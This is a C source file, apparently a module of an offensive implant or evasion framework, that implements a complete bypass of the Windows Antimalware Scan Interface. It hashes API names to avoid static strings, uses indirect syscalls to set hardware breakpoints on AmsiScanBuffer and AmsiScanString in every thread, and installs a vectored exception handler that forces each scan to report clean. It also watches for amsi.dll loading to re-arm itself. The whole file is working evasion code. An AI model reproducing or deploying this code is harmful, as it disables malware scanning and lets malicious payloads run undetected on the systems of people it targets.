#include "../Orchestrator/Config.h"
#include <windows.h>

#if defined(FEATURE_AMSI_BYPASS_ENABLED)

#include "../Evasion_Suite/include/common.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include <tlhelp32.h>

/* Forward Declaration */
BOOL RegisterAMSIDllWatch(void);

/*---------------------------------------------------------------------------
 *  AMSI result codes
 *-------------------------------------------------------------------------*/
#define AMSI_RESULT_CLEAN  0
#define S_OK_AMSI          0

/*---------------------------------------------------------------------------
 *  Target addresses (resolved at runtime)
 *-------------------------------------------------------------------------*/
static PVOID s_pAmsiScanBuffer = NULL;
static PVOID s_pAmsiScanString = NULL;
static PVOID s_hVEH            = NULL;

/* DJB2 hashes — no static strings */
#define HASH_AmsiScanBuffer  djb2_hash_ct("AmsiScanBuffer")
#define HASH_AmsiScanString  djb2_hash_ct("AmsiScanString")
#define HASH_AMSI_DLL        djb2_hash_ct("amsi.dll")

/*---------------------------------------------------------------------------
 *  Vectored Exception Handler
 *-------------------------------------------------------------------------*/
static LONG NTAPI VEH_AMSIHandler(EXCEPTION_POINTERS* pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    PVOID pExAddr = pExInfo->ExceptionRecord->ExceptionAddress;

    if (pExAddr == s_pAmsiScanBuffer || pExAddr == s_pAmsiScanString) {
        pExInfo->ContextRecord->Rax = S_OK_AMSI;

        __try {
            ULONG_PTR rsp = pExInfo->ContextRecord->Rsp;
            PVOID* ppResult = (PVOID*)(rsp + 0x30);
            if (*ppResult) {
                *(DWORD*)(*ppResult) = AMSI_RESULT_CLEAN;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }

        pExInfo->ContextRecord->Rip = *(ULONG_PTR*)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += sizeof(ULONG_PTR);
        pExInfo->ContextRecord->Dr6 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL SetHardwareBreakpoint(HANDLE hThread, PVOID pTargetAddr, int drIndex) {
    if (drIndex < 0 || drIndex > 3) return FALSE;
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NTSTATUS status = IndirectNtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) return FALSE;
    switch (drIndex) {
        case 0: ctx.Dr0 = (DWORD64)pTargetAddr; break;
        case 1: ctx.Dr1 = (DWORD64)pTargetAddr; break;
        case 2: ctx.Dr2 = (DWORD64)pTargetAddr; break;
        case 3: ctx.Dr3 = (DWORD64)pTargetAddr; break;
    }
    ctx.Dr7 &= ~(3ULL << (drIndex * 2));
    ctx.Dr7 |= (1ULL << (drIndex * 2));
    ctx.Dr7 &= ~(0xFULL << (16 + drIndex * 4));
    ctx.Dr6 = 0;
    status = IndirectNtSetContextThread(hThread, &ctx);
    return NT_SUCCESS(status);
}

static BOOL ClearHardwareBreakpoint(HANDLE hThread, int drIndex) {
    if (drIndex < 0 || drIndex > 3) return FALSE;
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NTSTATUS status = IndirectNtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) return FALSE;
    switch (drIndex) {
        case 0: ctx.Dr0 = 0; break;
        case 1: ctx.Dr1 = 0; break;
        case 2: ctx.Dr2 = 0; break;
        case 3: ctx.Dr3 = 0; break;
    }
    ctx.Dr7 &= ~(3ULL << (drIndex * 2));
    ctx.Dr7 &= ~(0xFULL << (16 + drIndex * 4));
    ctx.Dr6 = 0;
    status = IndirectNtSetContextThread(hThread, &ctx);
    return NT_SUCCESS(status);
}

static BOOL ApplyBreakpointsToAllThreads() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    DWORD currentPID = GetCurrentProcessId();
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == currentPID) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                if (hThread) {
                    SuspendThread(hThread);
                    if (s_pAmsiScanBuffer) SetHardwareBreakpoint(hThread, s_pAmsiScanBuffer, 0);
                    if (s_pAmsiScanString) SetHardwareBreakpoint(hThread, s_pAmsiScanString, 1);
                    ResumeThread(hThread);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);
    return TRUE;
}

BOOL InstallAMSIBypass(void) {
    PVOID pAmsi = GetModuleBaseByHash(HASH_AMSI_DLL);
    if (pAmsi) {
        s_pAmsiScanBuffer = GetExportByHash(pAmsi, HASH_AmsiScanBuffer);
        s_pAmsiScanString = GetExportByHash(pAmsi, HASH_AmsiScanString);
        if (!s_pAmsiScanBuffer) return FALSE;
        ApplyBreakpointsToAllThreads();
        s_hVEH = AddVectoredExceptionHandler(1, VEH_AMSIHandler);
        return (s_hVEH != NULL);
    }
    s_hVEH = AddVectoredExceptionHandler(1, VEH_AMSIHandler);
    if (!s_hVEH) return FALSE;
    RegisterAMSIDllWatch();
    return TRUE;
}

typedef struct _LDR_DLL_NOTIFICATION_DATA {
    ULONG             Flags;
    PSM_UNICODE_STRING FullDllName;
    PSM_UNICODE_STRING BaseDllName;
    PVOID             DllBase;
    ULONG             SizeOfImage;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef VOID (NTAPI* PLDR_DLL_NOTIFICATION_FUNCTION)(ULONG, PLDR_DLL_NOTIFICATION_DATA, PVOID);
typedef NTSTATUS (NTAPI* fnLdrRegisterDllNotification)(ULONG, PLDR_DLL_NOTIFICATION_FUNCTION, PVOID, PVOID*);

#define HASH_LdrRegisterDllNotification djb2_hash_ct("LdrRegisterDllNotification")
#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

static PVOID s_pDllNotifCookie = NULL;

static VOID NTAPI DllLoadCallback(ULONG Reason, PLDR_DLL_NOTIFICATION_DATA Data, PVOID Context) {
    if (Reason != LDR_DLL_NOTIFICATION_REASON_LOADED) return;
    if (!Data || !Data->BaseDllName || !Data->BaseDllName->Buffer) return;
    char szName[64] = { 0 };
    int len = Data->BaseDllName->Length / sizeof(WCHAR);
    if (len > 63) len = 63;
    for (int i = 0; i < len; i++) {
        WCHAR wc = Data->BaseDllName->Buffer[i];
        szName[i] = (wc >= L'A' && wc <= L'Z') ? (char)(wc + 32) : (char)wc;
    }
    szName[len] = '\0';
    if (djb2_hash_rt(szName) == HASH_AMSI_DLL) {
        s_pAmsiScanBuffer = GetExportByHash(Data->DllBase, HASH_AmsiScanBuffer);
        s_pAmsiScanString = GetExportByHash(Data->DllBase, HASH_AmsiScanString);
        if (s_pAmsiScanBuffer) ApplyBreakpointsToAllThreads();
    }
}

BOOL RegisterAMSIDllWatch(void) {
    PVOID pNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!pNtdll) return FALSE;
    fnLdrRegisterDllNotification pfn = (fnLdrRegisterDllNotification)GetExportByHash(pNtdll, HASH_LdrRegisterDllNotification);
    if (!pfn) return FALSE;
    NTSTATUS status = pfn(0, DllLoadCallback, NULL, &s_pDllNotifCookie);
    return NT_SUCCESS(status);
}

BOOL RemoveAMSIBypass(void) {
    HANDLE hThread = GetCurrentThread();
    ClearHardwareBreakpoint(hThread, 0);
    ClearHardwareBreakpoint(hThread, 1);
    if (s_hVEH) {
        RemoveVectoredExceptionHandler(s_hVEH);
        s_hVEH = NULL;
    }
    s_pAmsiScanBuffer = NULL;
    s_pAmsiScanString = NULL;
    return TRUE;
}

#else
BOOL InstallAMSIBypass(void) { return FALSE; }
BOOL RemoveAMSIBypass(void) { return FALSE; }
#endif
